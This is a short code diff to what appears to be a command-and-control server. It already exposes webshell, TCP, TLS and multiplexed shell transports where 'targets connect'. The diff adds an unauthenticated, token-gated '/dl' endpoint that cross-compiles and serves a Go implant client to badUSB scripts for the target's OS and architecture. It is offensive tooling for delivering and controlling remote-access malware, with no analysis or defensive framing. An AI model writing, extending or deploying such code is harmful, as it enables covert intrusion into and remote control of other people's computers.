@@ -20,6 +20,7 @@ import { webshellRouter } from "./transports/webshell.js";
 import { startTcp } from "./transports/tcp.js";
 import { startTls } from "./transports/tls.js";
 import { registerMux } from "./transports/mux.js";
+import { dlRouter } from "./api/build.js";
 
 const here = path.dirname(fileURLToPath(import.meta.url));
 const isSecure = (req) =>
@@ -35,6 +36,11 @@ expressWs(app);
 // These are where targets connect; they must not require operator credentials.
 app.use("/webshell", webshellRouter()); // HTTP beacon transport
 registerMux(app); // ws /mux — multiplexed protobuf shell transport
+
+// --- Public, token-gated endpoint (for badUSB scripts) --------------------
+// /dl cross-compiles + downloads the Go client for the target OS/arch.
+// Requires ?token=BUILD_TOKEN and is mounted before requireAuth.
+app.use("/dl", dlRouter());
 
 // --- Auth bootstrap (unauthenticated by necessity) -------------------------
 app.get("/login", (req, res) => {
